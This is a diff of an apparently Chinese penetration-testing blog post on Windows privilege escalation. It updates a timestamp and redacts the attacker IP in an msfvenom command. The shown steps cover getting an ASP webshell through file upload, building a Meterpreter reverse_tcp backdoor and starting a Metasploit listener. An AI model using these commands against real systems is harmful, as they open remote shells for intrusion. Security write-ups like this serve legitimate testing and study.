@@ -418,7 +418,7 @@
                 
               
 
-              <time title="创建时间：2019-07-10 09:25:10 / 修改时间：09:32:43" itemprop="dateCreated datePublished" datetime="2019-07-10T09:25:10+08:00">2019-07-10</time>
+              <time title="创建时间：2019-07-10 09:25:10 / 修改时间：09:33:47" itemprop="dateCreated datePublished" datetime="2019-07-10T09:25:10+08:00">2019-07-10</time>
             </span>
           
 
@@ -466,7 +466,7 @@
 <li><p>通过任意文件上传获取到ASP webshell<br><img src="%E8%AE%B0%E4%B8%80%E6%AC%A1Windows%E6%8F%90%E6%9D%83%E8%BF%87%E7%A8%8B/2019-07-09-17-25-26.png" alt></p>
 </li>
 <li><p>生成msf meterpreter后门</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=183.6.50.204 LPORT=50124 -f exe &gt; shell1.exe</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -f exe &gt; shell1.exe</span><br></pre></td></tr></table></figure>
 </li>
 <li><p>启动监听</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set PAYLOAD windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST x.x.x.x</span><br><span class="line">set LPORT xx</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
